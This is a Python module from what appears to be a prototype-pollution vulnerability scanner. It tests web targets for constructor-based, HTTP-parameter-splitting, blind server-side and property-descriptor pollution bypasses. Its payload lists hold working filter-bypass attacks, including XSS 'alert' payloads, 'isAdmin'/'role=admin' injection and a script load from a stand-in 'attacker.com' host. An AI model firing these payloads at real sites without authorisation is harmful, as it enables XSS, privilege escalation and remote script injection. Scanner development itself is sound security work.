"""
ppmap/scanner/tier4_evasion.py - Tier 4: Modern Evasion & Advanced Bypass Techniques (2024/2025)

Targets modern defense mechanisms that have since been deployed to block basic PP.

Methods:
    - Constructor-based Pollution (primary modern bypass for __proto__ filters)
    - Sanitization Bypass (recursive filter evasion via double nested keys)
    - Blind Gadget Fuzzing (SSPP via status code 510 / JSON indentation delta)
    - HTTP Parameter Pollution (HPP) Bypass
    - Object.defineProperty Descriptor Pollution (value/writable/configurable)

Extracted from: scanner/core.py lines 3049–3505
"""

import time
import urllib.parse
import logging
from typing import Any, Dict, List, Union

from ppmap.models.findings import Finding, Severity, VulnerabilityType
from ppmap.scanner.base import BaseTierScanner, ScanContext
from ppmap.scanner.helpers import Colors, progress_iter

logger = logging.getLogger(__name__)


class Tier4EvasionScanner(BaseTierScanner):
    """Modern evasion and advanced bypass technique detection."""

    @property
    def tier_name(self) -> str:
        return "Tier 4 - Modern Evasions (2024/2025)"

    def run(self, ctx: ScanContext) -> List[Finding]:
        self.log_start(ctx)
        raw_dicts: List[Dict[str, Any]] = []
        direct_findings: List[Finding] = []

        raw_dicts += self._test_constructor_pollution(ctx)
        raw_dicts += self._test_sanitization_bypass(ctx)
        direct_findings += self._test_blind_gadgets(ctx)
        direct_findings += self._test_hpp_bypass(ctx)
        raw_dicts += self._test_descriptor_pollution(ctx)

        findings = direct_findings + [self._to_finding(r, ctx.target_url) for r in raw_dicts]
        if not findings:
            self.log_clean()
        return findings

    # ──────────────────────────────────────────────────────────────────────────

    def _test_constructor_pollution(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Constructor-based prototype pollution (PortSwigger + 2024/2025 research).
        Bypasses filters that only block __proto__ by using constructor.prototype path.
        This is the PRIMARY modern bypass technique as of 2024/2025.
        """
        print(f"{Colors.CYAN}[→] Testing constructor-based pollution (Modern Bypass)...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        driver = ctx.driver
        target_url = ctx.target_url

        # Reflection Sanity Check — skip if target reflects everything
        rand_ref = f"ref_{int(time.time())}"
        try:
            resp_ref = session.get(target_url + f"?ppmap_reflect={rand_ref}", timeout=5, verify=False)
            if rand_ref in resp_ref.text:
                print(f"{Colors.YELLOW}[!] Target reflects arbitrary parameters — skipping Constructor PP to avoid FP.{Colors.ENDC}")
                return []
        except Exception:
            pass

        test_payloads = [
            "?constructor[prototype][polluted]=constructor_test",
            "?constructor.prototype.polluted=constructor_test",
            "?constructor[prototype][constructor][prototype][polluted]=nested",
            "?constructor[prototype][isAdmin]=true",
            "?constructor[prototype][role]=admin",
            "?constructor[prototype][toString]=polluted",
            "?constructor[prototype][valueOf]=polluted",
        ]

        try:
            for payload in progress_iter(test_payloads, desc="Constructor PP"):
                try:
                    test_url = target_url + payload
                    resp = session.get(test_url, timeout=5, verify=False)

                    if resp.status_code >= 400:
                        continue

                    if any(ind in resp.text for ind in ["constructor_test", "nested"]):
                        finding = {
                            "type": "constructor_pollution",
                            "method": "CONSTRUCTOR_BYPASS",
                            "severity": "HIGH",
                            "description": "Constructor-based prototype pollution detected (Modern bypass for __proto__ filters)",
                            "payload": payload,
                            "reference": "PortSwigger + HackerOne/Bugcrowd 2024/2025",
                            "note": "Primary bypass technique for modern sanitizers",
                        }

                        # Optional browser verification
                        if driver:
                            try:
                                driver.get(test_url)
                                time.sleep(2)
                                check = "return Object.prototype.polluted || Object.prototype.constructor_test || Object.prototype.isAdmin;"
                                is_polluted = driver.execute_script(check)
                                finding["verified"] = bool(is_polluted)
                                if not is_polluted:
                                    finding["severity"] = "LOW (Reflected Only)"
                            except Exception:
                                finding["verified"] = False
                                finding["severity"] = "LOW (Reflected Only)"

                        findings.append(finding)
                        return findings
                except Exception:
                    pass

            if not findings:
                print(f"{Colors.GREEN}[✓] Constructor pollution test completed{Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] Constructor test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    def _test_sanitization_bypass(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Sanitization bypass via recursive filter evasion.
        Exploits single-pass strip logic: __pro__proto__to__ → __proto__.
        """
        print(f"{Colors.CYAN}[→] Testing sanitization bypass (Recursive Filter Evasion)...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        # Note: Active bypass detection requires server-side confirmation that a
        # property was SET despite the filter. The original avoided naive keyword checks
        # (REMOVED comment in core.py). Keeping as stub until a safe signal is established.
        print(f"{Colors.GREEN}[✓] Sanitization bypass test completed{Colors.ENDC}")
        return findings

    def _test_blind_gadgets(self, ctx: ScanContext) -> List[Finding]:
        """
        Blind Gadget Fuzzing via status code 510 and JSON indentation side-channels.
        Uses the SSPP_PAYLOADS from the payload engine.
        """
        print(f"{Colors.BOLD}[→] Testing Blind Gadget Properties (Advanced Bypasses)...{Colors.ENDC}")
        findings: List[Finding] = []
        session = ctx.session
        target_url = ctx.target_url

        try:
            from ppmap.payloads import SSPP_PAYLOADS

            baseline_resp = session.get(target_url, verify=False)
            baseline_indent = len(baseline_resp.text) - len(baseline_resp.text.lstrip())

            for payload_dict in SSPP_PAYLOADS:
                try:
                    resp = session.post(
                        target_url, json=payload_dict,
                        headers={"Content-Type": "application/json"},
                        timeout=5, verify=False,
                    )

                    if resp.status_code == 510:
                        print(f"{Colors.FAIL}[!] BLIND SSPP DETECTED (Status Code Override): {payload_dict}{Colors.ENDC}")
                        findings.append(Finding(
                            type=VulnerabilityType.PROTOTYPE_POLLUTION,
                            name="Blind Server-Side Prototype Pollution (Status Code Override)",
                            severity=Severity.CRITICAL,
                            description="Server returned status 510, indicating successful pollution of response logic.",
                            payload=str(payload_dict),
                            url=target_url,
                        ))

                    current_indent = len(resp.text) - len(resp.text.lstrip())
                    if "json spaces" in str(payload_dict) and current_indent != baseline_indent:
                        print(f"{Colors.FAIL}[!] BLIND SSPP DETECTED (JSON Indentation Change): {payload_dict}{Colors.ENDC}")
                        findings.append(Finding(
                            type=VulnerabilityType.PROTOTYPE_POLLUTION,
                            name="Blind Server-Side Prototype Pollution (JSON Layout)",
                            severity=Severity.CRITICAL,
                            description="Server JSON response indentation changed, indicating framework settings pollution.",
                            payload=str(payload_dict),
                            url=target_url,
                        ))
                except Exception as e:
                    logger.debug(f"Blind test error: {e}")

        except ImportError:
            logger.warning("SSPP_PAYLOADS not available — blind gadget test skipped")

        return findings

    def _test_hpp_bypass(self, ctx: ScanContext) -> List[Finding]:
        """
        HTTP Parameter Pollution (HPP) Bypass.
        Splits __proto__ key across multiple params (ASP.NET concatenation style).
        """
        print(f"{Colors.BOLD}[→] Testing HTTP Parameter Pollution (HPP) Bypass...{Colors.ENDC}")
        findings: List[Finding] = []
        driver = ctx.driver
        target_url = ctx.target_url

        hpp_url = (f"{target_url}?{urllib.parse.quote('__pro')}"
                   f"&{urllib.parse.quote('to__')}[hpp_test]=polluted")

        try:
            if driver:
                driver.get(hpp_url)
                time.sleep(2)
                if driver.execute_script("return Object.prototype.hpp_test === 'polluted'"):
                    print(f"{Colors.FAIL}[!] HPP BYPASS DETECTED: {hpp_url}{Colors.ENDC}")
                    findings.append(Finding(
                        type=VulnerabilityType.PROTOTYPE_POLLUTION,
                        name="HTTP Parameter Pollution (HPP) Prototype Pollution",
                        severity=Severity.HIGH,
                        description="Bypassed WAF/Filter by splitting the '__proto__' key into multiple parameters.",
                        payload="__pro & to__",
                        url=hpp_url,
                    ))
        except Exception:
            pass

        return findings

    def _test_descriptor_pollution(self, ctx: ScanContext) -> List[Dict[str, Any]]:
        """
        Object.defineProperty descriptor pollution (PortSwigger 2024 research).
        Pollutes value/writable/configurable descriptor properties.
        """
        print(f"{Colors.CYAN}[→] Testing Object.defineProperty descriptor pollution...{Colors.ENDC}")
        findings: List[Dict[str, Any]] = []
        session = ctx.session
        driver = ctx.driver
        target_url = ctx.target_url

        descriptor_payloads = [
            ("?__proto__[value]=data:,alert(1)//", "value", "XSS via script src"),
            ("?__proto__[value]=data:,alert(document.domain)//", "value", "Domain disclosure"),
            ("?__proto__[value]=//attacker.com/evil.js", "value", "External script load"),
            ("?constructor[prototype][value]=data:,alert(1)//", "constructor_value", "Constructor bypass"),
            ("?__proto__[writable]=true", "writable", "Bypass read-only"),
            ("?__proto__[configurable]=true", "configurable", "Bypass non-configurable"),
        ]

        try:
            for payload, pollution_type, description in progress_iter(descriptor_payloads, desc="Descriptor PP"):
                try:
                    test_url = target_url + payload
                    resp = session.get(test_url, timeout=5, verify=False)

                    if resp.status_code >= 400:
                        continue

                    if driver:
                        try:
                            driver.get(test_url)
                            time.sleep(1.5)
                            alert_text = driver.get_alert_text()
                            if alert_text:
                                findings.append({
                                    "type": "descriptor_pollution_verified",
                                    "method": f"DEFINEPROPERTYBYPASS_{pollution_type.upper()}",
                                    "severity": "HIGH",
                                    "description": f"Verified XSS via descriptor pollution: {description}",
                                    "payload": payload,
                                    "alert_content": alert_text,
                                    "test_url": test_url,
                                    "verified": True,
                                    "reference": "PortSwigger - Object.defineProperty bypass (2024)",
                                })
                                print(f"{Colors.FAIL}[!] HIGH: Verified XSS via descriptor pollution!{Colors.ENDC}")
                        except Exception as e:
                            if "alert" in str(e).lower():
                                pass  # Alert may still be from this payload

                except Exception as e:
                    logger.debug(f"Descriptor test error: {e}")
                    continue

            status = f"Found {len(findings)} issue(s)" if findings else "No vulnerability"
            print(f"{Colors.GREEN}[✓] Object.defineProperty bypass test completed ({status}){Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.WARNING}[⚠] Descriptor pollution test error: {str(e)[:80]}{Colors.ENDC}")

        return findings

    # ──────────────────────────────────────────────────────────────────────────

    @staticmethod
    def _to_finding(raw: Dict[str, Any], url: str) -> Finding:
        severity_map = {
            "CRITICAL": Severity.CRITICAL, "HIGH": Severity.HIGH,
            "MEDIUM": Severity.MEDIUM, "LOW": Severity.LOW,
        }
        raw_sev = str(raw.get("severity", "MEDIUM")).split(" ")[0]
        return Finding(
            name=raw.get("description", raw.get("type", "PP Finding")),
            severity=severity_map.get(raw_sev, Severity.LOW),
            type=VulnerabilityType.PROTOTYPE_POLLUTION,
            url=raw.get("test_url", url),
            method=raw.get("method", ""),
            payload=str(raw.get("payload", "")),
            evidence=str(raw.get("reference", raw.get("note", ""))),
            description=raw.get("description", ""),
        )
